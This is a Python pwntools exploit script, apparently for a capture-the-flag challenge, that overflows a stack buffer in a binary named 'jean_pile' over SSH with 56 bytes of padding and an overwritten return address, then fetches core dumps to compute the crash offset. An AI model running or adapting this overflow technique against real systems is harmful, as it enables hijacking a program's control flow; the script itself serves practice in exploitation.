#!/usr/bin/env python3
from pwn import *
import struct

#buffer = b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaAAAAAA"
#buffer += p32(0x400a8c)
# Overflow here :)
#print(len(buffer))

ssh_connection = ssh(user='rei', host='192.168.2.67', keyfile='~/.ssh/temp_phone_home')
remote_path = '/home/rei/ctf/404/bin/chicken/jean_pile'

# beenarypaf = "./jean_pile"
# p = process(beenarypaf)

beenarypaf = remote_path
p = ssh_connection.process(beenarypaf)
elf = ELF('./jean_pile')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
context.endian = 'little'
#context.terminal = ['iterm', '-s', 'vert', '-w']

#buffer = cyclic(100, n=8)
# buffer = cyclic(56, n=8)
# mainaddr = elf.sym['main']
# buffer += p32(mainaddr)
buffer = b"A" * 56
buffer += p64(0x4007c7)

# gdb.attach(p, '''
# disassemble main
# br *0x4009c4
# continue
# ''')


p.recvuntil(b"Voulez-vous commander un plat ou plus ?\n>>> ")
p.sendline(b"1")
p.recvuntil("Choisissez un plat.")
p.sendline(buffer)
p.wait()


if p.poll() is not None:
    file_list = ssh_connection.run('ls').recvall().decode().split()
    core_files = [f for f in file_list if 'core.' in f]

    if core_files:
        latest_core = sorted(core_files)[-1]
        #remote_core_path = os.path.join(remote_path, latest_core)
        remote_core_path = os.path.join('.', latest_core)
        local_core_path = './' + latest_core
        ssh_connection.download(remote_core_path, local_core_path)
        print(f"Downloaded core file: {latest_core}")

        core = Coredump(remote_core_path)

        # Determine the crashing register and calculate the offset
        # crashing_reg = 'rip'
        # crashing_reg_value = getattr(core, crashing_reg)
        fault_value = getattr(core, 'fault_addr')

        # Convert this value to bytes assuming little-endian
        # fault_bytes = p64(fault_value)
        # #crashing_reg_bytes = p64(crashing_reg_value)
        # offset = cyclic_find(fault_bytes, n=8)
        # print(f"Offset found: {offset}")


        # fault_value = 0x616161706161616f
        fault_bytes = p64(fault_value)  # Use p64 for a 64-bit value, or p32 for a 32-bit value


        # Print out what the ASCII conversion looks like to understand what we are looking for
        print("ASCII representation of fault value:", fault_bytes)

        # Generate the cyclic pattern

        # Find the offset of the fault value within the cyclic pattern
        offset = cyclic_find(fault_bytes, n=8)
        print(f"Offset found: {offset}")
        print(elf.checksec())

p.interactive()
